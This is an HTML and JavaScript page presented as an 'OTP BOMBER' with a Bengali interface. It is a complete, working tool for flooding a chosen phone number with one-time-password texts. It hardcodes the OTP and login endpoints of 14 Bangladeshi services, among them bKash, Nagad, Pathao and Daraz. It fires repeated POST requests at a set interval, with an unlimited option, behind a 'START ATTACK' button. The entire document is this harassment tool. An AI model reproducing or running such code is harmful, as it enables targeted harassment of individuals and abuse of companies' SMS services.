<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NEON SHADOW | OTP BOMBER</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
  <style>
    body { background: #0a0a0a; font-family: 'Courier New', monospace; }
    .neon { text-shadow: 0 0 10px #00ff46; }
    .glass { background: rgba(17, 24, 39, 0.95); border: 1px solid #00ff46; }
  </style>
</head>
<body class="text-green-400 min-h-screen p-6">

  <div class="max-w-5xl mx-auto">
    <h1 class="text-4xl font-bold text-center neon mb-8">NEON SHADOW</h1>
    <p class="text-center text-red-500 mb-10">OTP BOMBER v2.5 - FIXED</p>

    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
      <div class="glass rounded-3xl p-8">
        <h2 class="text-xl mb-4">SELECT SERVICE</h2>
        
        <select id="service" onchange="loadService()" class="w-full p-4 bg-black border border-green-500 rounded-xl mb-4">
          <option value="">── SELECT SERVICE ──</option>
        </select>

        <input id="number" type="text" placeholder="017XXXXXXXX" class="w-full p-4 bg-black border border-green-500 rounded-xl mb-4 text-lg">

        <input id="apiUrl" type="text" placeholder="API URL" class="w-full p-4 bg-black border border-green-500 rounded-xl mb-4">

        <textarea id="bodyTemplate" rows="4" class="w-full p-4 bg-black border border-green-500 rounded-xl font-mono" placeholder='{"phone":"{number}"}'></textarea>

        <div class="grid grid-cols-2 gap-4 mt-6">
          <div>
            <label class="block text-sm mb-1">Interval (sec)</label>
            <input id="interval" type="number" value="5" min="3" class="w-full p-4 bg-black border border-green-500 rounded-xl">
          </div>
          <div>
            <label class="block text-sm mb-1">Max Requests (0=Unlimited)</label>
            <input id="maxRequests" type="number" value="0" class="w-full p-4 bg-black border border-green-500 rounded-xl">
          </div>
        </div>

        <div class="grid grid-cols-2 gap-4 mt-8">
          <button onclick="startAttack()" class="bg-green-600 py-5 rounded-xl font-bold text-lg">START ATTACK</button>
          <button onclick="stopAttack()" class="bg-red-600 py-5 rounded-xl font-bold text-lg">STOP</button>
        </div>
      </div>

      <div>
        <div class="glass rounded-3xl p-6 mb-6 text-center">
          <div id="status" class="text-xl font-bold"></div>
          <div id="counter" class="text-2xl font-bold text-yellow-400 mt-4"></div>
        </div>
        <div id="log" class="glass rounded-3xl p-6 h-96 overflow-auto text-sm"></div>
      </div>
    </div>
  </div>

  <script>
    const services = [
      {name: "Chorki", url: "https://api-dynamic.chorki.com/v1/auth/login", body: '{"mobile":"{number}"}'},
      {name: "DocTime", url: "https://api.doctime.com.bd/api/authenticate", body: '{"phone":"{number}"}'},
      {name: "RedX", url: "https://api.redx.com.bd/v1/user/signup", body: '{"phone":"{number}"}'},
      {name: "Shikho", url: "https://api.shikho.com/auth/v2/send/sms", body: '{"phone":"{number}"}'},
      {name: "KFC BD", url: "https://api.kfcbd.com/register", body: '{"mobile_number":"{number}"}'},
      {name: "OsudPotro", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: '{"phone":"{number}"}'},
      {name: "Arogga", url: "https://api.arogga.com/auth/v1/sms/send", body: '{"phone":"{number}"}'},
      {name: "Nagad", url: "https://api.nagad.com.bd/api/login", body: '{"mobileNumber":"{number}"}'},
      {name: "bKash", url: "https://api.bkash.com/v1/login/otp", body: '{"phone":"{number}"}'},
      {name: "Pathao", url: "https://api.pathao.com/v1/auth/otp/send", body: '{"mobile":"{number}"}'},
      {name: "Daraz", url: "https://api.daraz.com.bd/auth/send-otp", body: '{"phone":"{number}"}'},
      {name: "Foodpanda", url: "https://api.foodpanda.com.bd/v1/auth/otp", body: '{"phone_number":"{number}"}'},
      {name: "Sheba.xyz", url: "https://api.sheba.xyz/v1/auth/send-otp", body: '{"mobile":"{number}"}'},
      {name: "HungryNaki", url: "https://api.hungrynaki.com/v1/auth/otp", body: '{"phone":"{number}"}'}
    ];

    function loadServices() {
      const select = document.getElementById('service');
      services.forEach(s => {
        const opt = document.createElement('option');
        opt.value = s.name;
        opt.textContent = s.name;
        select.appendChild(opt);
      });
    }

    function loadService() {
      const name = document.getElementById('service').value;
      const found = services.find(s => s.name === name);
      if (found) {
        document.getElementById('apiUrl').value = found.url;
        document.getElementById('bodyTemplate').value = found.body;
      }
    }

    let intervalId = null;
    let count = 0;

    function log(msg, color = "text-green-400") {
      const logDiv = document.getElementById('log');
      const time = new Date().toLocaleTimeString();
      logDiv.innerHTML += `<span class="${color}">[${time}] ${msg}</span><br>`;
      logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function sendRequest() {
      const number = document.getElementById('number').value.trim();
      const url = document.getElementById('apiUrl').value.trim();
      const bodyTemplate = document.getElementById('bodyTemplate').value.trim();

      try {
        const body = bodyTemplate.replace(/\{number\}/g, number);
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: body
        });
        count++;
        document.getElementById('counter').textContent = `REQUESTS SENT: ${count}`;
        log("✅ SUCCESS", "text-green-400");
      } catch (e) {
        count++;
        document.getElementById('counter').textContent = `REQUESTS SENT: ${count}`;
        log(`❌ ${e.message}`, "text-red-400");
      }
    }

    function startAttack() {
      const number = document.getElementById('number').value.trim();
      const url = document.getElementById('apiUrl').value.trim();

      if (!number) return alert("নাম্বার দিন");
      if (!url) return alert("Service সিলেক্ট করুন");

      if (intervalId) return;

      count = 0;
      document.getElementById('counter').textContent = "REQUESTS SENT: 0";
      document.getElementById('status').innerHTML = `RUNNING → ${number}`;

      const ms = parseInt(document.getElementById('interval').value) * 1000;
      const max = parseInt(document.getElementById('maxRequests').value) || 0;

      intervalId = setInterval(() => {
        sendRequest();
        if (max > 0 && count >= max) stopAttack();
      }, ms);

      log(`🚀 STARTED on ${number}`, "text-yellow-400");
    }

    function stopAttack() {
      if (intervalId) clearInterval(intervalId);
      intervalId = null;
      document.getElementById('status').innerHTML = `<span class="text-red-500">STOPPED</span>`;
      log("⛔ STOPPED", "text-red-400");
    }

    window.onload = loadServices;
  </script>
</body>
</html>
